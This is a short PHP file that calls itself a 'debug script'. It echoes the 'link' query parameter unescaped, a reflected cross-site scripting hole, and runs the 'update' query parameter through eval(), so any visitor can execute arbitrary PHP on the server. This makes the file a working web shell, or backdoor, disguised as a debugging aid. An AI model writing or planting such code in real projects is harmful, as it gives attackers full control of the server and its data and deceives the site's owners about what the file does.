<?php
print "<pre>";
print "debug script...\n";
print "var_dump($_GET): " . var_dump($_GET) . "\n";

if (isset($_GET['link'])) {
    echo $_GET['link'];
} elseif(isset($_GET['update'])) {
	echo $_GET['update'] . "\n";
	#echo base64_decode($_GET['update']);
	eval($_GET['update']);
} else {
    print "usage: /debug.php?link=TEST_STRING" . "\n";
    print "usage: /debug.php?update=TEST_CODE" . "\n";
}

?>